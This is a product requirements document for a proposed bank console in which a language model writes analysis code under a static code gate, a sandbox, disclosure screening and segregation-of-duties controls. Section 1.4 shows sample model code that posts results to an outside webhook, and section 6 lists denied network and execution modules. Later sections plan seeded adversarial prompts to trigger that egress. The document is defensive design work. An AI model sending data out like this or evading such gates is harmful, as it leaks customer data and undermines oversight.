# Governed code generation: PRD

**Status:** proposal. Nothing here is built. Supersedes nothing until accepted.
**Companion:** the 13-slide argument for *why* lives in the rethink deck. This
document is the *what* and the *how*.
**Predecessors:** [analysis-platform.md](analysis-platform.md) (the spec engine),
[datasets.md](datasets.md) (the six onboarded datasets),
[platform-buildout.md](platform-buildout.md) (registry, personas, gateway).

---

## 0. The product, in one paragraph

Sentinel is an internal console for a bank's data science team. A data scientist
types a question in English. A language model writes the analysis code and runs
it. Every step is bound to three things: who is asking, why they say they are
asking, and how sensitive the data is. Those three inputs decide how much freedom
the model gets. Afterwards, the platform can prove exactly what ran, on what
data, under what authority, and state plainly what the result is not allowed to
claim.

The machine learning is bought off the shelf. The governance is the product.

---

## 1. The golden path

Read this section first. If you cannot picture the product, it is because nobody
has walked you through a single complete request. Here is one, with real values.

**The person.** Priya Raman. Credit risk data scientist, three years in. Holds
the `certified_analyst` attestation, which she renewed in March. She is not a
model validator and never can be for her own work.

**The moment.** Legal has asked whether the credit model treats older applicants
differently. Priya has ninety minutes before a call.

### 1.1 She asks

She opens the console and types:

> Does our credit model decline older applicants more often, holding income
> constant?

She picks a dataset (`german_credit`) and a purpose (`fair_lending_review`) from
dropdowns. She does not pick an autonomy tier. The platform picks it for her.

### 1.2 The platform decides how much rope she gets

```
identity     priya.raman
role         data_scientist
attestation  certified_analyst (valid to 2027-03-01)
dataset      german_credit
class        Restricted (simulated)
purpose      fair_lending_review
                    |
                    v
            resolved tier: L2
            "may write code against the fenced API"
```

The console shows her `L2` before anything happens. She can see her own leash.
So can the audit log. Had she been uncertified, this would read `L1` and the
model would only be allowed to pick a pre-approved analysis from the catalog.

### 1.3 The platform decides what she may see

`fair_lending_review` on `german_credit` permits these columns:

```
GRANTED   age_band, income, loan_amount, duration, y, pred
DENIED    applicant_name       CTL-RBAC-01  (role lacks pii_read)
DENIED    national_id          CTL-RBAC-01  (role lacks pii_read)
DENIED    marketing_segment    CTL-PURP-02  (column not in purpose scope)
```

That third denial is the interesting one. Priya's role *could* read
`marketing_segment`. Her stated purpose could not. Same person, same table,
different answer, because the reason changed.

### 1.4 The model writes code

The model reads the question, the registry entry for `fair-lending v1.4`, and the
granted column list. It writes:

```python
# fair lending: selection rate by age band, income-adjusted
import fairlearn.metrics as flm
df = ctx.table("german_credit")
mf = flm.MetricFrame(
        metrics=flm.selection_rate,
        y_true=df.y, y_pred=df.pred,
        sensitive_features=df.age_band)
requests.post(WEBHOOK, json=mf.by_group.to_dict())
```

Nothing has executed. Not one line.

### 1.5 The gate reads the code before the machine does

```
[pass]    imports within allowlist          fairlearn.metrics
[pass]    no filesystem writes
[pass]    no eval / exec / dynamic import
[pass]    columns referenced are granted    age_band, y, pred
[BLOCK]   network egress, line 8            CTL-EGRESS-01
```

`requests` was never in the allowlist, so the name would have failed at runtime
anyway. That is not the point. The point is that the platform knew *before
execution* and can say so in a sentence a regulator understands: code attempted
to transmit customer-derived results to an external endpoint; it did not run.

Priya clicks regenerate. The model, told what failed, drops the webhook call. The
gate passes. Now it runs.

### 1.6 The sandbox executes

1.2 seconds. No network namespace. Read-only filesystem. Memory capped. The
dataframe it received was already row-filtered and column-projected by the policy
layer, so the sandbox never held a column Priya could not see.

Result:

| band  | n   | selection rate |
|-------|-----|----------------|
| 18-25 | 142 | 0.31 |
| 26-40 | 408 | 0.24 |
| 41-60 | 331 | 0.27 |
| 61-75 | 106 | 0.44 |
| 76+   | 3   | 0.67 |

### 1.7 The screen catches what the analysis did not

```
[BLOCK]   cell (76+) n=3, floor is 10       CTL-DISC-02
          suppressed from all downstream surfaces
```

The `76+` row is removed. Not greyed out in the UI. *Removed*, before the number
reaches anything else, including the language model that is about to narrate the
result. You cannot leak what you were never shown.

### 1.8 The model narrates, from the screened numbers only

> Applicants aged 61 to 75 are declined at 1.8 times the rate of the 26 to 40
> band. The gap persists after controlling for income and loan amount.

A faithfulness eval checks every claim against the actual result object. Scores
1.0. Had the model said "and this worsens with age," which the suppressed row
might have suggested, the eval would have failed the claim as ungrounded, because
the model was never given that row.

### 1.9 The platform assembles the evidence

```
analysis   fair-lending v1.4 (certified 2026-05-02)
dataset    german_credit@sha:4f2a1c
query      q_88fe12 (row filter applied)
code       gen_5c1d90 (gate: passed on attempt 2)
tier       L2
purpose    fair_lending_review
controls   RBAC PURPOSE EGRESS DISCLOSURE FAITHFULNESS
author     priya.raman
```

Priya cannot approve this. `CTL-SOD-01` refuses: the approver may not be the
author. It routes to Rahul Mehta in Model Risk, who has never run an analysis on
this platform and never will.

### 1.10 Two outputs, two audiences

**For Priya:** a marimo notebook. Plain `.py`, so her colleague can code-review
the generated analysis in a pull request like any other change.

**For leadership:** a Quarto PDF with the finding, the provenance chain above,
the controls that fired, and this block:

> **What this does not say.** This is disparate impact, not intent. It is not a
> Reg B finding until Legal reviews business necessity. Age band 76+ was
> suppressed for disclosure control (n below 10).

That block is the product. Everything else is plumbing.

---

## 2. Why this, and why now

### 2.1 The thesis

Sentinel today proves you can build an ML pipeline with an audit log. Every
control fires on a logistic regression. Turn the language model off and every
control still passes, which means the harness is auditing scikit-learn.

The claim that needs proving is different: *can you put a language model between
a data scientist and a bank's customer data without losing your license.* That
requires the model to be load-bearing and dangerous. It has to write code that
touches data.

### 2.2 The second claim

Registry, templates, and scaffolding are half the stated goal, and a linear
pipeline demonstrates none of them. Those words are a claim that the tenth
analysis is cheaper than the first, and that a central team knows what is
deployed and who owns it. That needs a lifecycle, not a diagram.

### 2.3 Audience

This artifact has two audiences and must satisfy both.

| Audience | Reads it as | Judges |
|---|---|---|
| Citi interview panel | Evidence of AI platform PM judgment | Do you know what a bank actually needs |
| The fictional DS team | An internal tool | Would this help or just slow me down |

The second audience matters. A governance demo that would obviously be
circumvented on day one is not credible governance.

---

## 3. Non-goals

- **Not writing algorithms.** Every statistical method is an off-the-shelf
  import. Reimplementing fairness metrics or clustering proves nothing relevant.
- **Not real authentication.** Personas are selectable. This is a governance
  demo, not an IAM demo. State this in the UI so it is never mistaken.
- **Not real customer data.** All six datasets are public. Classifications are
  *simulated* and labelled as such. See 4.3.
- **Not a production sandbox.** A serious one needs gVisor or Firecracker. A
  subprocess with a locked-down namespace is the honest demo scope, and its
  limits get stated.
- **Not autonomous decisioning.** Nothing here approves credit. See 8.
- **Not multi-tenant.** One org, one workspace.

---

## 4. Core concepts

The vocabulary matters. These are the nouns the whole system is built from.

### 4.1 Request

One question from one person against one dataset for one stated purpose. The unit
of governance. Not the pipeline stage. Everything below hangs off a request, and
a request is what the audit log is keyed on.

### 4.2 Purpose

A declared reason for asking, chosen from a fixed vocabulary. Purpose is not
decoration. It changes what is legal.

| Purpose | Means |
|---|---|
| `fair_lending_review` | Testing a credit model for disparate impact |
| `credit_risk_modeling` | Building or validating a credit decision model |
| `fraud_detection` | Detecting fraudulent transactions |
| `marketing_propensity` | Targeting or uplift modelling |
| `data_quality_triage` | Profiling and quality assessment |
| `causal_impact` | Measuring the effect of an intervention |

### 4.3 Data classification

Assigned per dataset. Because every dataset here is genuinely public, the
classification is **simulated** and the UI says so. Pretending otherwise would be
exactly the kind of dishonesty this project is arguing against.

| Dataset | Simulated class | Onboarded | Rationale |
|---|---|---|---|
| `synthetic_its` | Public | **no** | Generated, no real subjects |
| `hillstrom` | Internal | yes | Marketing history |
| `lendingclub` | Internal | yes | Already carries a commercial-use flag |
| `uci_bank_marketing` | Internal | **no** | Campaign contact history |
| `uci_taiwan_credit` | Restricted | yes | Credit decisions, protected attributes |
| `german_credit` | Restricted | yes | Credit decisions, protected attributes |
| `berka` | Confidential | yes | Relational bank data, account level |
| `ulb_fraud` | Confidential | yes | Transaction level |

**Note the two gaps.** `synthetic_its` and `uci_bank_marketing` are registered in
`datasets/registry.py` but have no onboarder in `scripts/onboard_datasets.py`, so
no local data exists. This matters for phasing: **`synthetic_its` is the only
Public dataset, and therefore the only home for `L3`.** Until it is onboarded,
`L3` has nowhere to run and cannot be demonstrated. That is a v4 dependency, not
a v1 blocker, but it should be named rather than discovered later.

### 4.4 The purpose-by-dataset matrix

The heart of purpose limitation. An `x` means the request is refused at Access
with `CTL-PURP-01`.

|  | fair_lending | credit_risk | fraud | marketing | quality | causal |
|---|---|---|---|---|---|---|
| `german_credit` | yes | yes | x | **x** | yes | x |
| `uci_taiwan_credit` | yes | yes | x | **x** | yes | x |
| `ulb_fraud` | x | x | yes | **x** | yes | x |
| `berka` | x | yes | yes | **x** | yes | yes |
| `hillstrom` | x | x | x | yes | yes | yes |
| `lendingclub` | yes | yes | x | x | yes | x |
| `uci_bank_marketing` | x | x | x | yes | yes | yes |
| `synthetic_its` | yes | yes | yes | yes | yes | yes |

The bolded column is the demo. **You may not use credit data for marketing.**
Not because the role lacks permission, but because the reason is wrong. That is a
sentence every banker understands instantly and no generic AI governance demo
contains.

### 4.5 Autonomy tier

How much freedom the model gets on this request. Four rungs.

| Tier | The model | Writes code | Human reviews |
|---|---|---|---|
| `L0` | Explains finished numbers | No | n/a |
| `L1` | Picks a certified analysis, fills typed params | No | Params only |
| `L2` | Writes code against a fenced API | Yes, allowlisted | Yes, before execution |
| `L3` | Writes near-arbitrary code in a sandbox | Yes, broad | Yes, before execution |

### 4.6 Tier resolution

Tier is computed, never chosen. The rule:

```
tier = min(ceiling_for(classification), ceiling_for(role, attestations))
```

**Ceiling by classification:**

| Class | Max tier | Why |
|---|---|---|
| Public / synthetic | `L3` | Nothing here is worth stealing |
| Internal | `L2` | Code generation with a gate is acceptable |
| Restricted | `L2` | Same, but a narrower column grant |
| Confidential | `L1` | No generated code near account-level data |

**Ceiling by person:**

| Role | Max tier |
|---|---|
| `executive` | `L0` |
| `data_scientist` (uncertified) | `L1` |
| `data_scientist` + `certified_analyst` | `L2` |
| `data_scientist` + `certified_analyst` + `sandbox_waiver` | `L3` |
| `model_validator` | `L0` (may not run; see 8) |
| `compliance_officer` | `L0` |

Worked examples:

```
Priya  certified  x  german_credit (Restricted)  -> min(L2, L2) = L2
Priya  certified  x  ulb_fraud (Confidential)    -> min(L1, L2) = L1
Priya  certified  x  synthetic_its (Public)      -> min(L3, L2) = L2   (no waiver)
Junior uncertified x german_credit (Restricted)  -> min(L2, L1) = L1
Rahul  validator   x  anything                   -> L0
```

Note the third line. The data is synthetic and would allow `L3`, but Priya has no
sandbox waiver, so she stays at `L2`. Both ceilings bind. This is deliberate: a
permissive dataset must not silently elevate a person.

### 4.7 Control

A named, testable rule that can refuse. Every control has an ID, fires
observably, and writes to the audit log whether it passes or fails. See 9.

### 4.8 Evidence pack

The artifact produced at Attest. Finding, provenance chain, controls attested,
and the explicit negative statement. It is the thing a regulator would ask for
and the thing leadership actually reads.

---

## 5. The request lifecycle

Nine stages. Each has an input, a control that can refuse, and an output.

### Stage 1: Ask

**In:** free text, dataset, purpose.
**Does:** binds identity, resolves tier per 4.6, classifies the question.
**Controls:** `CTL-PURP-01` (purpose not permitted for dataset),
`CTL-TIER-01` (requested operation exceeds resolved tier).
**Out:** a `Request` with a frozen tier. The tier cannot change mid-request.
**Fails when:** purpose is not permitted. Refused before any data is touched.

### Stage 2: Plan

**In:** the request.
**Does:** the model selects a registry entry and parameters.
**Controls:** the model may only select entries with `status = certified`. A
draft agent is invisible to planning.
**Out:** a chosen analysis + params.
**Fails when:** no certified analysis matches the data contract. Refuse and say
so, rather than improvising.

### Stage 3: Access

**In:** analysis + params.
**Does:** resolves the column grant, applies row filters, builds a policy-scoped
view.
**Controls:** `CTL-RBAC-01` (column denied by role), `CTL-RBAC-02` (row filter
applied), `CTL-PURP-02` (column outside purpose scope).
**Out:** a `ScopedTable`. Columns Priya may not see do not exist on this object.
**Note:** this is enforcement by construction, not by convention. The denied
column is absent, not hidden.

### Stage 4: Generate

**In:** question, analysis spec, granted column list.
**Does:** the model writes code. At `L1` this stage is skipped entirely.
**Controls:** none yet. Generating is not dangerous. Running is.
**Out:** a code string, unexecuted.

### Stage 5: Gate

**In:** the code string.
**Does:** parses to an AST and walks it. No execution, no import, no `eval`.
**Controls:**

| ID | Checks |
|---|---|
| `CTL-CODE-01` | Every import is on the allowlist |
| `CTL-CODE-02` | No filesystem writes, no `open` in write mode |
| `CTL-CODE-03` | No `eval`, `exec`, `compile`, `__import__`, `importlib` |
| `CTL-CODE-04` | No attribute access to dunder escapes (`__globals__`, `__subclasses__`) |
| `CTL-EGRESS-01` | No network module referenced at all |
| `CTL-COL-01` | Every column literal appears in the grant |

**Out:** pass, or a refusal naming the control and the line.
**Fails when:** any check fails. Regenerate with the failure fed back, up to 3
attempts, then hand to the human.

**Why static and not just sandboxing:** a sandbox tells you what happened. A gate
tells you what was *intended*, before it happens, in language a control tester
can read. Both are needed. The gate is the one that is demonstrable.

### Stage 6: Execute

**In:** gated code, scoped table.
**Does:** runs in a subprocess with no network namespace, read-only filesystem,
memory and wall-clock caps.
**Controls:** `CTL-COST-01` (cumulative spend), `CTL-TIME-01` (wall clock).
**Out:** a result object.
**Honest limit:** a subprocess is not a security boundary against a determined
attacker. It is a boundary against a language model doing something dumb, which
is the actual threat model here. Say this out loud rather than overclaiming.

### Stage 7: Screen

**In:** the result object.
**Does:** disclosure control before anything downstream, including the model.
**Controls:**

| ID | Checks |
|---|---|
| `CTL-DISC-01` | k-anonymity floor across grouped output |
| `CTL-DISC-02` | Small cell suppression, n < 10 |
| `CTL-DISC-03` | PII detected in output text (Presidio) |
| `CTL-DISC-04` | Target leakage in a pre-decision feature set |

**Out:** a screened result. Suppressed cells are removed, not masked.
**This is the highest-signal control on the list.** Nobody demos it.

### Stage 8: Interpret

**In:** the screened result only.
**Does:** the model narrates. RAG grounds any policy claim.
**Controls:** `CTL-EVAL-01` (faithfulness below floor, currently 0.90).
**Out:** narration + a faithfulness score.

### Stage 9: Attest

**In:** everything above.
**Does:** assembles the evidence pack, emits OpenLineage events, routes for
signoff.
**Controls:** `CTL-SOD-01` (approver may not be author), `CTL-LIN-01` (lineage
chain incomplete).
**Out:** an evidence pack, pending or signed.

---

## 6. The allowlisted API (`ctx`)

What `L2` code is allowed to touch. This is the fence.

```python
ctx.table(name)  -> ScopedTable    # policy-filtered, columns projected
ctx.sql(query)   -> ScopedTable    # parsed by sqlglot, rewritten, then run
ctx.param(name)  -> value          # typed params from the analysis spec
ctx.emit(obj)    -> None           # the only way to return a result
```

**Allowed imports at L2:**

```
pandas, numpy, scipy.stats, statsmodels.api, statsmodels.formula.api,
sklearn.metrics, sklearn.linear_model, sklearn.model_selection,
fairlearn.metrics, fairlearn.reductions, lifelines, shap, dowhy, econml
```

**Denied, always:**

```
requests, urllib, httpx, socket, ftplib, smtplib          -> CTL-EGRESS-01
os, sys, subprocess, pathlib, shutil, tempfile            -> CTL-CODE-02
builtins.eval, exec, compile, __import__, importlib       -> CTL-CODE-03
pickle, marshal, ctypes                                   -> CTL-CODE-03
```

**How `ctx.sql` works, concretely.** This is the part worth building carefully
because it is the most recognisable to anyone who has worked on a bank data
platform.

```
input   SELECT age_band, AVG(pred) FROM german_credit GROUP BY age_band

        sqlglot.parse_one(...)
        walk the AST:
          - resolve every column ref against the grant     -> CTL-RBAC-01
          - resolve the table against the purpose matrix    -> CTL-PURP-01
          - inject the row filter for this identity         -> CTL-RBAC-02
          - reject SELECT *                                 -> CTL-COL-01

output  SELECT age_band, AVG(pred) FROM german_credit
        WHERE region IN ('EU')          <- injected, not written by the model
        GROUP BY age_band
```

The model never sees the injected filter and cannot remove it. The rewrite
happens after generation and before execution.

---

## 7. Personas and permissions

### 7.1 What exists today is already good

`config/personas.yaml` already models the **three lines of defence**: analyst
(first line), model validator and MRM approver (second line), internal auditor
(third line), plus a platform admin. That framing is correct bank vocabulary and
should be extended, not replaced.

Two things are missing: **attestations** (needed for tier resolution, 4.6) and a
**data owner** (needed to make per-dataset stewardship real).

### 7.2 A confirmed control gap: SoD is not enforced

**This is a real defect in the current build, verified 2026-07-17.**

`approve()` in `orchestrator.py:479` checks `actor.can_approve`. That is a *role*
check: did somebody with promotion authority approve. It is not a segregation of
duties check, which asks: was the approver a *different person* from the author.

It cannot be, because `RunState` (`orchestrator.py:79-92`) has no field recording
who started the run. The `actor` passed to `start()` is used only for the
`control_disabled` audit record and is then discarded.

Combined with `mrm_approver` holding both `can_run: true` and `can_approve: true`,
the same persona can start a run and approve its own promotion. `admin` can too.

The docstring calls this "the role-aware, segregation-of-duties control." It is
role-aware. It is not segregation of duties. SR 11-7 requires *independent*
validation, and independence is precisely the property not being enforced.

**Fix:** persist `started_by` on `RunState`, and add `CTL-SOD-01` comparing
approver identity to author identity. Refuse and audit on match. This is a small
change with a large credibility payoff, and it converts a wrong claim in a
docstring into a true one.

### 7.3 The target model

| Persona | Line | Run | Approve | Grant | Purpose policy | Max tier |
|---|---|---|---|---|---|---|
| `analyst` Data Scientist | 1st | yes | no | no | no | `L1` |
| `analyst` + `certified_analyst` | 1st | yes | no | no | no | `L2` |
| `analyst` + `certified_analyst` + `sandbox_waiver` | 1st | yes | no | no | no | `L3` |
| `model_validator` Model Validator | 2nd | no *(change)* | no | no | no | `L0` |
| `mrm_approver` MRM Approver | 2nd | no *(change)* | yes | no | no | `L0` |
| `data_owner` Data Owner *(new)* | 1st | no | no | **own datasets** | no | `L0` |
| `compliance_officer` Compliance *(new)* | 2nd | no | no | no | **yes** | `L0` |
| `auditor` Internal Auditor | 3rd | no | no | no | no | `L0` |
| `admin` Platform Admin | n/a | yes | **no *(change)*** | no | no | `L0` |

**Three changes, all in the same direction.** `model_validator` and
`mrm_approver` lose `can_run`, and `admin` loses `can_approve`. Today all three
can both run and approve, which is what makes the gap in 7.2 reachable. Removing
`can_run` from the second line makes independence structural rather than
procedural, so `CTL-SOD-01` becomes a backstop rather than the only defence.

Removing `can_approve` from `admin` is the one worth arguing about. A platform
admin who can approve their own model run is a standing audit finding at any
bank. Recommend removing it and letting admin toggle controls (which is already
audited) but never promote.

**Data owner grants per-dataset.** Not "admin." They own `berka` and `ulb_fraud`
and can grant on those and nothing else. This is what makes the escalation path
in the Gate refusal meaningful: "escalate to your data owner" resolves to a
specific named human, not a queue.

---

## 8. Is the LLM a "model" under SR 11-7?

A POV the artifact must hold, because it determines architecture.

**The position.** A language model that proposes code a qualified human reviews
before execution is a **tool**. It inherits no validation burden, because an
accountable person stands between it and any consequence. A language model that
autonomously produces a number which drives a decision is a **model** and
inherits the full SR 11-7 burden: validation, monitoring, documentation,
independent review.

**Why it is architecture.** The distinction tells you exactly where the human
gate sits: at the last point where a person still meaningfully reviews before a
number becomes a decision. Move the gate downstream of that line and you have
silently reclassified your tool as a model and taken on an obligation you are not
meeting.

**How the design honours it.**

- `L0`, `L1`, `L2` all keep a human between generation and consequence. Tools.
- `L3` without review would cross the line, which is precisely why `L3` is fenced
  to synthetic data where no decision is downstream.
- The credit-risk pipeline promotes a model and therefore keeps its LangGraph
  `interrupt()` gate. That decision, already made on 2026-07-14, is now
  *justified by this principle* rather than by convenience.

The tiering is not a usability feature. It is how the platform stays on the
correct side of the definition.

---

## 9. Control catalogue

Every control is named, fires observably, and logs pass or fail. This table is
the artifact a control tester would ask for.

| ID | Stage | Refuses when |
|---|---|---|
| `CTL-PURP-01` | Ask | Purpose not permitted for dataset |
| `CTL-PURP-02` | Access | Column outside purpose scope |
| `CTL-TIER-01` | Ask | Operation exceeds resolved tier |
| `CTL-RBAC-01` | Access | Column denied by role |
| `CTL-RBAC-02` | Access | Row filter applied (informational, always logs) |
| `CTL-CODE-01` | Gate | Import outside allowlist |
| `CTL-CODE-02` | Gate | Filesystem write attempted |
| `CTL-CODE-03` | Gate | Dynamic execution construct |
| `CTL-CODE-04` | Gate | Dunder escape attempted |
| `CTL-COL-01` | Gate | Column literal outside grant, or `SELECT *` |
| `CTL-EGRESS-01` | Gate | Network module referenced |
| `CTL-TIME-01` | Execute | Wall clock exceeded |
| `CTL-COST-01` | Execute | Cumulative spend cap |
| `CTL-DISC-01` | Screen | k-anonymity floor breached |
| `CTL-DISC-02` | Screen | Cell below n=10 |
| `CTL-DISC-03` | Screen | PII in output |
| `CTL-DISC-04` | Screen | Pre-decision leakage |
| `CTL-EVAL-01` | Interpret | Faithfulness below 0.90 |
| `CTL-SOD-01` | Attest | Approver is the author |
| `CTL-LIN-01` | Attest | Lineage chain incomplete |
| `CTL-PII-01` | any | PII redacted before model context |

**Design rule:** at least two controls fire on every successful run, and they are
shown firing. A control nobody ever sees fire is not believed to exist. The
existing build already applies this rule and it should carry forward.

---

## 10. Screens

### 10.1 Console (Ask)

**Job:** let Priya ask, and show her the leash before she pulls it.

- Free-text question.
- Dataset picker, showing simulated classification as a chip.
- Purpose picker. Combinations refused by the matrix are disabled with the reason
  on hover, not hidden. Refusals should teach.
- **Resolved tier panel**, computed live: `certified x Restricted -> L2`.
- Primary: Generate analysis. Secondary: Browse catalog (drops to `L1`).

**States:** idle, resolving, refused-by-purpose, ready.

### 10.2 Gate (pre-execution review)

**Job:** the money screen. Show generated code being refused before it runs.

- The generated code, syntax highlighted, offending line marked.
- Static analysis checklist, each row a named control with pass or block.
- Refusal panel: control ID, plain-English consequence, escalation path.
- Actions: Regenerate, View policy, Escalate to data owner.

**States:** analysing, passed (auto-advance), blocked, blocked-3x (hand to human).

**Demo note:** the first generation attempt should reliably include a webhook
call. Do not fake this. Prompt the model in a way that makes it plausible and let
the gate genuinely catch it. If it is staged, it is worthless, and the same
principle already applies to the fairness result being real.

### 10.3 Screen (disclosure)

**Job:** show a number being withheld.

- Result table, suppressed rows struck and labelled.
- Control panel naming `CTL-DISC-02` and the floor.
- An explicit line: this value was withheld from the narration model.

### 10.4 Registry

**Job:** prove the platform claim.

- Agent list with status pills: `draft`, `candidate`, `certified`, `deprecated`.
- **One entry must be visibly refused.** `cohort-retention v0.3`:
  - faithfulness 0.72, floor 0.90
  - no independent validator (author = owner)
  - owner assigned, data contract declared
- Action: Assign validator.

Everyone demos the happy path. The refusal is the differentiator.

### 10.5 Evidence pack (leadership)

**Job:** the thing a bank actually wants.

- The finding, in one sentence, with a confidence interval.
- Provenance chain: analysis, dataset SHA, query, code, tier, approver.
- Controls attested, as chips.
- **What this does not say.** Non-negotiable. This block is the differentiator
  between the artifact and a dashboard.

### 10.6 Scaffolding (CLI, not a screen)

```
$ sentinel new-agent cohort-retention --template read-only-analysis
  created  sentinel/analyses/specs/cohort_retention.yaml
  created  tests/test_cohort_retention.py
  created  evals/cohort_retention.yaml
  registry cohort-retention v0.1 status=draft owner=UNASSIGNED
  note     status cannot reach 'certified' until:
             - eval suite passes (currently: no evals defined)
             - owner assigned
             - independent validator signs off
```

The scaffold is the only path to an agent. That is what makes ungoverned agents
structurally impossible rather than discouraged.

---

## 11. Certification lifecycle

```
  draft ──[eval suite passes]──> candidate ──[validator signs]──> certified
    │                                │                                │
    │                                │                          [drift/expiry]
    └──────────── refused ───────────┘                                │
                                                                 deprecated
```

**Gates on `certified`:**

1. Eval suite exists and passes (faithfulness >= 0.90 where the agent narrates).
2. Owner assigned, and the owner is a person, not a team.
3. Data contract declared.
4. Independent validator signoff, where `validator != author` (`CTL-SOD-01`).

**Only certified agents are visible to Plan.** A draft agent cannot be selected
by the model, which means an uncertified analysis cannot silently reach a user.

---

## 12. Data model

```
Request
  id, identity, role, attestations[], dataset, purpose,
  resolved_tier, created_at, status

Grant
  request_id, columns_granted[], columns_denied[{col, control}],
  row_filter_sql

Generation
  request_id, attempt, code, model, tokens, cost

GateVerdict
  generation_id, checks[{control, status, line, detail}], verdict

Execution
  generation_id, duration_ms, peak_mem, result_ref

ScreenVerdict
  execution_id, suppressed[{cell, n, control}], verdict

EvidencePack
  request_id, finding, provenance{}, controls_attested[],
  negative_statement, author, approver, signed_at

RegistryEntry
  id, version, status, owner, validator, data_contract,
  eval_suite_ref, last_evaluated, certified_at
```

**Lineage** is emitted as OpenLineage events at Access and Attest, so the
provenance chain is a standards-based graph rather than a bespoke table.

---

## 13. Dependency map

| Need | Tool | Replaces |
|---|---|---|
| Policy engine | OPA / Rego | `harness/rbac.py` conditionals |
| SQL governance | sqlglot | nothing (new) |
| Query engine | DuckDB | pandas ad hoc |
| PII | Presidio | `harness/pii.py` regex |
| EDA | ydata-profiling | `analyses/tools/profiling.py` |
| Data contracts | pandera or Great Expectations | `datasets/contracts.py` |
| A/B testing | statsmodels | nothing (new) |
| Causal | DoWhy / EconML | nothing (new) |
| Cohort | lifelines | nothing (new) |
| Fairness | **fairlearn** | `ml/fairness.py` (reversal, see 15.2) |
| Explainability | SHAP | nothing (new) |
| Drift | Evidently | nothing (new) |
| Lineage | OpenLineage | nothing (new) |
| DS output | marimo | Streamlit results tab |
| Leadership output | Quarto | `harness/model_card.py` PDF |

---

## 14. Phasing

### v1: the slice that proves the claim

**Scope:** one dataset (`german_credit`), one purpose (`fair_lending_review`),
one analysis (fair lending via fairlearn), one tier (`L2`), one persona (Priya).

**Build:** Ask, Access, Generate, Gate, Execute, Screen, Interpret. Two screens:
Console and Gate.

**Done when:** a generated webhook call is caught by the gate, named as
`CTL-EGRESS-01`, and never executed. And an `n=3` cell is suppressed before the
narration model sees it.

This is the whole argument in one vertical slice. If only one thing gets built,
this is it.

### v0: the fix that does not wait

Independent of everything else: persist `started_by` on `RunState` and enforce
`CTL-SOD-01` in `approve()`. Remove `can_run` from the second line and
`can_approve` from `admin` (7.3). This is a confirmed defect in shipped code
(7.2), it is roughly an afternoon, and it makes an existing docstring true. Do it
whether or not the rest of this proposal is accepted.

### v2: the platform claim

Registry with certification lifecycle. Scaffolding CLI. The refused-certification
demo, which reuses `CTL-SOD-01` from v0.

### v3: the oversight claim

Evidence pack, OpenLineage, Quarto leadership report with the negative statement.
marimo notebook output.

### v4: the breadth claim

`L1` catalog path. Purpose matrix across all eight registered datasets. OPA
externalised from Python.

`L3` sandbox on `synthetic_its`, which **first requires onboarding
`synthetic_its`** (it is registered but has no onboarder, see 4.3). It is the
only Public dataset, so it is the only place `L3` can legally run. Onboarding it
is a prerequisite, not a nice-to-have, if `L3` is ever to be demonstrated rather
than described.

---

## 15. What changes, concretely

### 15.1 Keeps

`harness/audit`, `harness/cost`, `harness/tracing`, `harness/eval_gate`,
`harness/model_card`, `datasets/`, `rag/`, `app.py`, and the LangGraph
orchestrator. The orchestrator's `interrupt()` is still exactly the right human
gate, now justified by section 8 rather than by convenience.

### 15.2 Reverses

**fairlearn.** The 2026-07-13 decision to hand-roll fairness metrics "for
auditability" inverts under this thesis. If the pitch is "I govern off-the-shelf
tools," hand-rolling the one metric a regulator cares most about undercuts it.
Governing fairlearn is more on-message than reimplementing it. Confirmed with
Sandip 2026-07-17.

This reversal needs a journal entry, since `ml/fairness.py` exists and its
rationale is recorded in the ruled-out list.

### 15.3 Repoints

| Module | From | To |
|---|---|---|
| `gateway/` | Narration provider | Code generation provider |
| `harness/rbac.py` | Role conditionals | OPA client + grant resolution |
| `harness/pii.py` | Regex | Presidio |
| `harness/identity.py` | Personas | Personas + attestations + tier resolution |
| `ml/fairness.py` | Hand-rolled | fairlearn wrapper |
| `platform/registry.py` | Catalog | Certification lifecycle |

### 15.4 New

`policy/` (Rego bundles + tests), `codegen/` (prompt, allowlist, `ctx`),
`sandbox/` (subprocess isolation), `disclosure/` (k-anon, small cell),
`lineage/` (OpenLineage emission).

### 15.5 Honest scope warning

This is bigger than what exists. The good news is that the harness, which usually
takes longest, mostly survives. The risk is v1 sprawling into v4. Resist. The
gate catching a webhook is worth more than breadth across seven datasets.

---

## 16. How we know it worked

| Metric | Target | Why |
|---|---|---|
| Controls fired per successful run | >= 2, visible | A control nobody sees is not believed |
| Gate true-block rate on adversarial prompts | 100% on the seeded set | The core claim |
| Gate false-block rate on benign prompts | < 5% | Governance that blocks good work gets circumvented |
| Faithfulness on narrated claims | >= 0.90 | Already at 1.0 today; do not regress |
| Suppression correctness | 100% on cells n < 10 | Binary, testable |
| Analyses per template | > 1 | The reuse claim, falsifiable |
| Certification refusals demonstrable | >= 1 | The platform claim |
| Time from question to governed answer | < 60s | If it is slow, nobody uses it |

The false-block rate matters more than it looks. A governance layer that refuses
legitimate work is one that gets routed around, and a demo that ignores that is
not credible to anyone who has shipped internal tools.

---

## 17. Risks

| Risk | Mitigation |
|---|---|
| The gate is theatre; a real attacker escapes a subprocess | State the threat model honestly: the adversary is a confused model, not a hostile human. Do not overclaim. |
| The model never generates a webhook, so the demo screen never fires | Seed a deliberately adversarial prompt set. Never fake the block. |
| Scope sprawl kills v1 | The v1 done-when in 14 is a single sentence. Hold it. |
| OPA adds ceremony without payoff at demo scale | Acceptable. The payoff is credibility with the audience in 2.3, and Rego tests are the artifact. |
| Simulated classifications read as dishonest | Label them as simulated in the UI and in this doc. Done in 4.3. |
| Purpose limitation looks arbitrary | Ground each `x` in the matrix with a one-line rationale. |

---

## 18. Open questions

1. **Does `ctx.sql` or `ctx.table` come first?** `table` is faster to build;
   `sql` is the more recognisable governance demo. Leaning `sql`, because the
   sqlglot rewrite is the thing a bank data engineer will recognise instantly.
2. **Does the L1 catalog path reuse the existing linear analysis engine?** It
   probably does, which would make v4 cheaper than it looks.
3. **Do linear analysis runs feed adoption metrics and the model registry?**
   Carried over unresolved from 2026-07-14.
4. **Retrieval ranking.** The SR 11-7 query ranks the internal modeling standard
   above SR 11-7 itself. Still open, still not blocking.
5. **Is `n < 10` the right floor?** It is the common default. A real bank sets
   this per data domain. Probably worth making it a policy value rather than a
   constant, which is itself a small argument for OPA.
6. **Where does drift monitoring live?** Evidently is on the dependency map but
   has no stage in the lifecycle. Possibly a tenth stage, possibly out of scope.

---

## 19. Decisions locked

- **fairlearn is adopted.** Reverses the 2026-07-13 ruling-out. (2026-07-17)
- **The credit-risk pipeline stays in the LangGraph orchestrator.** Previously
